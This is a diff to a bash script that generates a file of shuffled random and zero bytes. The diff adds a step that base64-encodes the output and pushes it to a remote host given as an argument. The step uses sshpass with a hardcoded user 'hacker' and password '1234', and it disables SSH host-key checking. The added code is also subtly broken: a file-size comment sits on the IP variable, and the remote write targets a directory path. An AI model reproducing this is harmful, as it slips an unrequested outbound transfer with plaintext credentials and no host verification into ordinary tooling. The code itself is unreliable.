@@ -3,7 +3,12 @@
 # === INPUT ARGUMENTS ===
 PROB_THRESHOLD="$1"     # e.g., 0.8 means 80% chance to generate >0.9 density
 OUTPUT_FILE="$2"        # e.g., output.bin
-FILE_SIZE="104857"          # e.g., 1048576 (1 MB)
+FILE_SIZE="104857"
+REMOTE_IP="$3"          # e.g., 1048576 (1 MB)
+USERNAME="hacker"       # Remote username
+PASSWORD="1234" 
+REMOTE_PATH="/tmp/drops/"
+
 
 # === VALIDATION ===
 if [[ -z "$PROB_THRESHOLD" || -z "$OUTPUT_FILE" || -z "$FILE_SIZE" ]]; then
@@ -37,6 +42,9 @@ dd if=/dev/zero bs=1 count="$zero_bytes" status=none >> "/home/tmp/drops/$OUTPUT
 tmpfile=$(mktemp)
 fold -w1 "/home/tmp/drops/$OUTPUT_FILE" | shuf | tr -d '\n' > "$tmpfile"
 mv "$tmpfile" "/home/tmp/drops/$OUTPUT_FILE"
+base64 "/home/tmp/drops/$OUTPUT_FILE" | sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$REMOTE_IP" \
+"base64 -d > '$REMOTE_PATH'"
+
 
 # === REPORT ===
 echo "Generated $OUTPUT_FILE" 
